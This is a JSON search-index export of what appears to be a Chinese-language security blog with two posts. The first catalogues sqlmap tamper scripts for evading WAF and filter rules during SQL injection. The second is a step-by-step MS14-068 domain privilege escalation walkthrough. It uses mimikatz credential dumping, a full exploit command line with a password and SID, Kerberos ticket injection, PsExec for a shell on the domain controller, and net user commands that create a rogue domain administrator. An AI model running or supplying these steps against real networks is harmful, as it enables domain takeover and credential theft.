{"pages":[{"title":"About","date":"2019-12-06T10:53:00.890Z","path":"about/index.html","text":""},{"title":"Categories","date":"2019-12-06T10:53:00.890Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2019-12-06T10:53:00.890Z","path":"tags/index.html","text":""}],"posts":[{"title":"sqlmap绕过脚本","date":"2019-12-06T10:35:56.512Z","path":"undefined/sqlmap绕过脚本/","text":"^.^不忘初心，方得始终。 sqlmap绕过脚本说明123456789101112131415161718192021222324252627282930313233apostrophemask.py 用utf8代替引号equaltolike.py like 代替等号space2dash.py 绕过过滤‘=’ 替换空格字符（”），（'' – '）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）greatest.py 绕过过滤’&gt;’ ,用GREATEST替换大于号。space2hash.py 空格替换为#号 随机字符串 以及换行符apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符appendnullbyte.py 在有效负荷结束位置加载零字节字符编码ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’space2mssqlblank.py 空格替换为其它空符号base64encode.py 用base64编码替换space2mssqlhash.py 替换空格modsecurityversioned.py 过滤空格，包含完整的查询版本注释space2mysqlblank.py 空格替换其它空白符号(mysql)between.py 用between替换大于号（&gt;）space2mysqldash.py 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）multiplespaces.py 围绕SQL关键字添加多个空格space2plus.py 用+替换空格bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为likenonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filtersspace2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾chardoubleencode.py 双url编码(不处理以编码的)unionalltounion.py 替换UNION ALL SELECT UNION SELECTcharencode.py url编码randomcase.py 随机大小写unmagicquotes.py 宽字符绕过 GPC addslashesrandomcomments.py 用/**/分割sql关键字charunicodeencode.py 字符串 unicode 编码securesphere.py 追加特制的字符串versionedmorekeywords.py 注释绕过space2comment.py Replaces space character (‘ ‘) with comments ‘/**/’","tags":[],"categories":[]},{"title":"域权限提升14-068","date":"2019-06-30T13:28:42.000Z","path":"undefined/域权限提升14-068/","text":"^.^不忘初心，方得始终。 域权限提升14-068MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测 1systeminfo |find \"3011780\" 1.当获取到一个权限之后，利用溢出或者其他办法尽量把权限提到最高 2.利用溢出加载mimikataz获取当前系统内的账号密码域信息 3.通过mimikatz抓取：123456789101112131415域提权的基本要求如下： 账号:zhangsan 密码:2wsx3edc@WSX#EDC 域:ADMINCC（net view /domain） 域管名字:（dsquery server） \"CN=WIN-YUKONG,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=admincc,DC=com\" 然后ping WIN-YUKONG得到全称WIN-yukong.admincc.com S-1-5-21-3151176444-1385148096-3760465446-1113（whoami /all） 用户名 SID ===================== ============================================= admincc\\administrator S-1-5-21-3151176444-1385148096-3760465446-500 以上提取出：123456域：ADMINCC 普通域账号：zhangsan 密码：2wsx3edc@WSX#EDC DNS：admincc.com SID：S-1-5-21-3151176444-1385148096-3760465446-1113 域管理全称：WIN-yukong.admincc.com 4.ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码MS14-068.exe -u zhangsan@admincc.com -s S-1-5-21-3151176444-1385148096-3760465446-1113 -d 192.168.10.3 -p 2wsx3edc@WSX#EDC https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 5.票据注入，需要高权限去操作，我把票据拷贝到本地，然后我用溢出添加了一个test用户，登陆后把票据拷入进去（我想着可能可以直接用psexec去操作不过好像也有点麻烦） mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造， mimikatz # kerberos::list //查看当前机器凭证 mimikatz # kerberos::ptc 票据文件 //将票据注入到内存中 因为是2003的机器所以没有注入成功 搞了台win7重新伪造下试试，在同一个段内不用加入域就成 查看下kerberos::list 最重要的一步要来了，在mimikataz窗口中输入exit，然后输入klist查看凭证 注意一定要在这个窗口只有这里才能看到票据缓存，其他窗口中的缓存看不到 6.获取交互式shell psexec PsExec.exe \\WIN-yukong.admincc.com cmd.exe 7.添加域管 net user testyuguan2 Aa123456 /add /domain net localgroup administrators testyuguan2 /add /domain 8.登录域管","tags":[],"categories":[]}]}